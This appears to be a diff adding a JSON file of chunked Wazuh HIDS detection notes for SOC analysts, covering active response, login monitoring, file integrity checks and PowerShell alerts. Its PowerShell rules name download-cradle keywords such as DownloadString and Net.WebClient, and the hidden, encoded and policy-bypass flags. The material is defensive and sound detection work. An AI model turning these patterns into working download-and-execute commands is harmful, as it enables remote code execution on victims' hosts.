+    "text": "## Correlation\nEnrich both Suricata network flows (IPs/Domains) and Wazuh endpoint events (File Hashes) with threat intelligence to provide a unified risk score for the incident.",
+    "topic": "Ransomware",
+    "platform": "General",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_active_response.md",
+    "chunk_id": "wazuh-wazuh_active_response-chunk-0",
+    "title": "Wazuh Active Response",
+    "text": "# Wazuh Active Response",
+    "topic": "Brute Force",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_active_response.md",
+    "chunk_id": "wazuh-wazuh_active_response-chunk-1",
+    "title": "Wazuh Active Response",
+    "text": "## Description\nActive Response is a feature in Wazuh that allows the system to execute scripts or commands on an agent (or the manager) automatically in response to specific alerts or alert severity levels. This enables automated containment and remediation actions.",
+    "topic": "Brute Force",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_active_response.md",
+    "chunk_id": "wazuh-wazuh_active_response-chunk-2",
+    "title": "Wazuh Active Response",
+    "text": "## SOC Application\nActive Response is used to reduce the Mean Time To Respond (MTTR) by taking immediate action without analyst intervention. Common use cases include:\n1. **Firewall Blocking:** Automatically adding a malicious source IP to a local firewall blocklist (Windows Firewall, iptables, pfSense) after a brute-force attack or exploit attempt is detected.\n2. **Process Termination:** Killing a specific malicious process (e.g., `cmd.exe` spawned by a web server) if a high-severity alert fires.\n3. **Account Disable:** Disabling a compromised Active Directory account if Pass-the-Hash or impossible travel is detected.",
+    "topic": "Brute Force",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_active_response.md",
+    "chunk_id": "wazuh-wazuh_active_response-chunk-3",
+    "title": "Wazuh Active Response",
+    "text": "## Detection Clues\nActive Response itself is not a detection mechanism, but its logs indicate that automated containment was applied. Analysts should look for logs indicating `active-response` was triggered to understand the current state of the endpoint.",
+    "topic": "Brute Force",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_active_response.md",
+    "chunk_id": "wazuh-wazuh_active_response-chunk-4",
+    "title": "Wazuh Active Response",
+    "text": "## Example Wazuh Alert\nWazuh detects a brute force attack (Rule 5712) and automatically triggers the `firewall-drop` active response script to block the source IP for 600 seconds.",
+    "topic": "Brute Force",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_active_response.md",
+    "chunk_id": "wazuh-wazuh_active_response-chunk-5",
+    "title": "Wazuh Active Response",
+    "text": "## Investigation Guidance\nWhen investigating an alert where Active Response fired, verify if the response was successful. Check if the block broke legitimate functionality (false positive). Do not rely entirely on the automated response; investigate the root cause of the initial alert.",
+    "topic": "Brute Force",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_authentication_monitoring.md",
+    "chunk_id": "wazuh-wazuh_authentication_monitoring-chunk-0",
+    "title": "Wazuh Authentication Monitoring",
+    "text": "# Wazuh Authentication Monitoring",
+    "topic": "Credential Access",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_authentication_monitoring.md",
+    "chunk_id": "wazuh-wazuh_authentication_monitoring-chunk-1",
+    "title": "Wazuh Authentication Monitoring",
+    "text": "## Description\nWazuh monitors authentication logs across various operating systems, including Windows Security Event Logs (Event IDs 4624, 4625), Linux auth.log, and macOS OpenDirectory. It normalizes these logs into a standard format for rule evaluation.",
+    "topic": "Credential Access",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_authentication_monitoring.md",
+    "chunk_id": "wazuh-wazuh_authentication_monitoring-chunk-2",
+    "title": "Wazuh Authentication Monitoring",
+    "text": "## SOC Application\nAuthentication monitoring is vital for detecting Credential Access and Lateral Movement techniques:\n1. **Brute Force:** Wazuh tracks failed login attempts and triggers alerts when a threshold is reached from a single IP or against a single user.\n2. **Anomalous Logins:** Detecting logins at unusual times or from unexpected geographic locations (impossible travel).\n3. **Lateral Movement:** Monitoring Windows Logon Types. For example, a Logon Type 3 (Network) or Logon Type 10 (RemoteInteractive) using an Administrator account from a non-IT workstation is highly suspicious.\n4. **Privilege Escalation:** Detecting successful logins using the `root` or `Administrator` accounts.",
+    "topic": "Credential Access",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_authentication_monitoring.md",
+    "chunk_id": "wazuh-wazuh_authentication_monitoring-chunk-3",
+    "title": "Wazuh Authentication Monitoring",
+    "text": "## Detection Clues\n- Look for Event ID 4625 (Failed Logon) followed immediately by Event ID 4624 (Successful Logon) from the same source IP, indicating a successful brute force attack.\n- Monitor for Logon Type 9 (NewCredentials), often associated with Pass-the-Hash attacks or `runas /netonly`.",
+    "topic": "Credential Access",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_authentication_monitoring.md",
+    "chunk_id": "wazuh-wazuh_authentication_monitoring-chunk-4",
+    "title": "Wazuh Authentication Monitoring",
+    "text": "## Example Wazuh Alert\n`Rule: 5712 - SSHD brute force trying to get access to the system.`\n`Src IP: 192.168.1.100`\n`User: root`",
+    "topic": "Credential Access",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_authentication_monitoring.md",
+    "chunk_id": "wazuh-wazuh_authentication_monitoring-chunk-5",
+    "title": "Wazuh Authentication Monitoring",
+    "text": "## Correlation\nCorrelate authentication failures with Suricata alerts for network scanning or exploit attempts originating from the same source IP.",
+    "topic": "Credential Access",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_file_integrity_monitoring.md",
+    "chunk_id": "wazuh-wazuh_file_integrity_monitoring-chunk-0",
+    "title": "Wazuh File Integrity Monitoring (FIM)",
+    "text": "# Wazuh File Integrity Monitoring (FIM)",
+    "topic": "Ransomware",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_file_integrity_monitoring.md",
+    "chunk_id": "wazuh-wazuh_file_integrity_monitoring-chunk-1",
+    "title": "Wazuh File Integrity Monitoring (FIM)",
+    "text": "## Description\nFile Integrity Monitoring (FIM), provided by the Wazuh Syscheck module, watches designated files and directories for changes. It detects creation, modification, and deletion of files, as well as changes to permissions, ownership, and attributes.",
+    "topic": "Ransomware",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_file_integrity_monitoring.md",
+    "chunk_id": "wazuh-wazuh_file_integrity_monitoring-chunk-2",
+    "title": "Wazuh File Integrity Monitoring (FIM)",
+    "text": "## SOC Application\nFIM is crucial for detecting:\n1. **Malware Droppers:** Identifying when new executables are placed in `C:\\Windows\\Temp` or user `Downloads` folders.\n2. **Persistence Mechanisms:** Detecting modifications to `C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp` or `/etc/rc.local`.\n3. **Configuration Tampering:** Identifying unauthorized changes to `/etc/shadow`, `sshd_config`, or Windows registry keys.\n4. **Ransomware:** Detecting mass file encryption events (rapid file rename and modification).",
+    "topic": "Ransomware",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_file_integrity_monitoring.md",
+    "chunk_id": "wazuh-wazuh_file_integrity_monitoring-chunk-3",
+    "title": "Wazuh File Integrity Monitoring (FIM)",
+    "text": "## Detection Clues\n- A sudden spike in FIM alerts indicates a major system change, potentially ransomware or a malicious script rapidly altering configurations.\n- Alerts for files changing in web server root directories (e.g., `/var/www/html`) may indicate web shell installation.",
+    "topic": "Ransomware",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_file_integrity_monitoring.md",
+    "chunk_id": "wazuh-wazuh_file_integrity_monitoring-chunk-4",
+    "title": "Wazuh File Integrity Monitoring (FIM)",
+    "text": "## Example Wazuh Alert\n`Rule: 550 - Integrity checksum changed.`\n`File: /etc/passwd`\n`Action: modified`",
+    "topic": "Ransomware",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_file_integrity_monitoring.md",
+    "chunk_id": "wazuh-wazuh_file_integrity_monitoring-chunk-5",
+    "title": "Wazuh File Integrity Monitoring (FIM)",
+    "text": "## Correlation\nFIM alerts should be correlated with Process Creation events (Sysmon Event ID 1) to determine *which process* caused the file modification.",
+    "topic": "Ransomware",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_powershell_rules.md",
+    "chunk_id": "wazuh-wazuh_powershell_rules-chunk-0",
+    "title": "Wazuh Detection: PowerShell & Process Execution Rules",
+    "text": "# Wazuh Detection: PowerShell & Process Execution Rules",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_powershell_rules.md",
+    "chunk_id": "wazuh-wazuh_powershell_rules-chunk-1",
+    "title": "Wazuh Detection: PowerShell & Process Execution Rules",
+    "text": "## Overview\n\nWazuh is an open-source Host-based Intrusion Detection System (HIDS) that processes security events from agents installed on endpoints.",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_powershell_rules.md",
+    "chunk_id": "wazuh-wazuh_powershell_rules-chunk-2",
+    "title": "Wazuh Detection: PowerShell & Process Execution Rules",
+    "text": "## PowerShell Detection Rules\n\nWazuh uses specific rule IDs to detect suspicious PowerShell execution:\n\n### Rule 92250: Suspicious PowerShell Execution\n- **Rule ID:** 92250\n- **Severity Level:** 10 (High)\n- **Group:** windows, sysmon, process_creation\n- **Description:** Detects PowerShell process execution with suspicious arguments such as `-EncodedCommand`, `-enc`, `-w hidden`, or `-executionpolicy bypass`.\n- **Alert Interpretation:** Indicates potential malicious script execution or download cradle. Immediate inspection of the decoded Base64 command is required.",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_powershell_rules.md",
+    "chunk_id": "wazuh-wazuh_powershell_rules-chunk-3",
+    "title": "Wazuh Detection: PowerShell & Process Execution Rules",
+    "text": "### Rule 92251: PowerShell Download Cradle Detected\n- **Rule ID:** 92251\n- **Severity Level:** 12 (High)\n- **Description:** Triggers when PowerShell command lines contain `Invoke-WebRequest`, `DownloadString`, `Net.WebClient`, or `Start-BitsTransfer`.\n- **Alert Interpretation:** Indicates an active payload download attempt from remote external infrastructure.",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_powershell_rules.md",
+    "chunk_id": "wazuh-wazuh_powershell_rules-chunk-4",
+    "title": "Wazuh Detection: PowerShell & Process Execution Rules",
+    "text": "### Rule 60106: Sysmon Event ID 1 \u2014 Process Creation\n- **Rule ID:** 60106\n- **Severity Level:** 3 (Low/Informational)\n- **Description:** Captures standard Windows process creation event with full parent-child process tree and command-line parameters.",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_powershell_rules.md",
+    "chunk_id": "wazuh-wazuh_powershell_rules-chunk-5",
+    "title": "Wazuh Detection: PowerShell & Process Execution Rules",
+    "text": "## Field Structure in Wazuh Alerts\n\nWazuh alerts contain normalized fields:\n- `win.eventdata.image`: Path to executable (e.g. `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`)\n- `win.eventdata.commandLine`: Raw command line executed\n- `win.eventdata.parentImage`: Parent executable path\n- `win.eventdata.user`: User account under which execution occurred\n- `rule.id`: Rule identifier\n- `rule.level`: Numerical severity score (0 to 15)",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_powershell_rules.md",
+    "chunk_id": "wazuh-wazuh_powershell_rules-chunk-6",
+    "title": "Wazuh Detection: PowerShell & Process Execution Rules",
+    "text": "## Response & Investigation Actions\n\n1. Check rule severity and rule ID to categorize the threat.\n2. Isolate the target host if rule level >= 12 or confirmed malicious payload execution.\n3. Review related Sysmon network logs (Event ID 3) for outbound connections around the alert timestamp.",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_windows_security.md",
+    "chunk_id": "wazuh-wazuh_windows_security-chunk-0",
+    "title": "Wazuh Detection: Windows Authentication & Security Events",
+    "text": "# Wazuh Detection: Windows Authentication & Security Events",
+    "topic": "Credential Access",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_windows_security.md",
+    "chunk_id": "wazuh-wazuh_windows_security-chunk-1",
+    "title": "Wazuh Detection: Windows Authentication & Security Events",
+    "text": "## Authentication Event Rules\n\nWazuh processes Windows Event Log security audits to track user access, logon failures, and privilege escalations.\n\n### Rule 60109: Windows Logon Failure (Event ID 4625)\n- **Rule ID:** 60109\n- **Severity Level:** 5 (Medium)\n- **Description:** Detects failed user authentication attempt.\n- **Logon Types:**\n  - `Logon Type 2`: Interactive logon (keyboard at host).\n  - `Logon Type 3`: Network logon (SMB, RDP, shared folders).\n  - `Logon Type 10`: Remote Desktop Protocol (RDP).",
+    "topic": "Credential Access",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_windows_security.md",
+    "chunk_id": "wazuh-wazuh_windows_security-chunk-2",
+    "title": "Wazuh Detection: Windows Authentication & Security Events",
+    "text": "### Rule 60115: Multiple Failed Logons (Brute Force Detection)\n- **Rule ID:** 60115\n- **Severity Level:** 10 (High)\n- **Description:** Triggers when a threshold of failed logon attempts (Rule 60109) occurs within a short window from the same source IP or user account.\n\n### Rule 60122: User Account Privilege Escalation (Event ID 4728 / 4732)\n- **Rule ID:** 60122\n- **Severity Level:** 8 (Medium-High)\n- **Description:** Detects addition of a user to a sensitive security group (e.g. Administrators, Domain Admins).",
+    "topic": "Credential Access",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_windows_security.md",
+    "chunk_id": "wazuh-wazuh_windows_security-chunk-3",
+    "title": "Wazuh Detection: Windows Authentication & Security Events",
+    "text": "## Endpoint Monitoring Best Practices\n\n- Correlate failed logon spikes with subsequent successful interactive logons to detect credential stuffing or brute force success.\n- Check source IP addresses against internal subnet maps to distinguish between lateral movement and external attacks.",
+    "topic": "Credential Access",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_detection.md",
+    "chunk_id": "wazuh-wazuh_detection-chunk-0",
+    "title": "Wazuh Detection \u2014 Process Creation and PowerShell Alerts",
+    "text": "# Wazuh Detection \u2014 Process Creation and PowerShell Alerts",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_detection.md",
+    "chunk_id": "wazuh-wazuh_detection-chunk-1",
+    "title": "Wazuh Detection \u2014 Process Creation and PowerShell Alerts",
+    "text": "## Wazuh Alert Context\n\nWazuh is a host-based intrusion detection system (HIDS) that monitors endpoints via\nagents. When Wazuh detects suspicious activity, it generates alerts with structured\nmetadata including rule IDs, severity levels, and event descriptions.",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_detection.md",
+    "chunk_id": "wazuh-wazuh_detection-chunk-2",
+    "title": "Wazuh Detection \u2014 Process Creation and PowerShell Alerts",
+    "text": "## Process Creation Monitoring\n\nWazuh monitors process creation events on Windows endpoints through:\n\n- **Sysmon integration:** Captures detailed process creation (Event ID 1)\n- **Windows Security Audit:** Process creation events (Event ID 4688)\n- **Command-line logging:** Records full command-line arguments",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_detection.md",
+    "chunk_id": "wazuh-wazuh_detection-chunk-3",
+    "title": "Wazuh Detection \u2014 Process Creation and PowerShell Alerts",
+    "text": "## PowerShell-Related Wazuh Rules\n\nWazuh includes rules that detect suspicious PowerShell activity:\n\n- Execution of encoded PowerShell commands\n- PowerShell downloading files from the internet\n- PowerShell executing with suspicious flags (-NoProfile, -NonInteractive, -Hidden)\n- Unusual parent-child process relationships involving PowerShell",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_detection.md",
+    "chunk_id": "wazuh-wazuh_detection-chunk-4",
+    "title": "Wazuh Detection \u2014 Process Creation and PowerShell Alerts",
+    "text": "## Alert Severity Interpretation\n\n- **Low:** Informational PowerShell activity, likely administrative\n- **Medium:** Unusual PowerShell flags or execution context\n- **High:** Encoded commands, download cradles, or known malicious patterns\n- **Critical:** Confirmed malicious payload signatures or active exploitation",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_detection.md",
+    "chunk_id": "wazuh-wazuh_detection-chunk-5",
+    "title": "Wazuh Detection \u2014 Process Creation and PowerShell Alerts",
+    "text": "## Interpreting Wazuh Alerts in AI Analysis\n\nWhen analyzing a Wazuh-sourced alert:\n\n1. The alert represents a detection that has ALREADY occurred on the host\n2. The `event` field describes what Wazuh observed\n3. The `rule_id` maps to a specific Wazuh detection rule\n4. The `source` field confirms this came from the Wazuh HIDS\n5. Do NOT assume additional telemetry beyond what the alert provides\n6. Treat the alert as the starting point for investigation, not a conclusion",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Wazuh",
+    "category": "hids-detection",
+    "document": "wazuh_detection.md",
+    "chunk_id": "wazuh-wazuh_detection-chunk-6",
+    "title": "Wazuh Detection \u2014 Process Creation and PowerShell Alerts",
+    "text": "## Correlation Guidance\n\n- Cross-reference Wazuh process alerts with network-level detections (Suricata)\n- Look for temporal correlation: events within a short window on the same host\n- Check if the same user account triggered multiple alerts\n- Verify whether the source IP is an internal or external address",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  }
+]
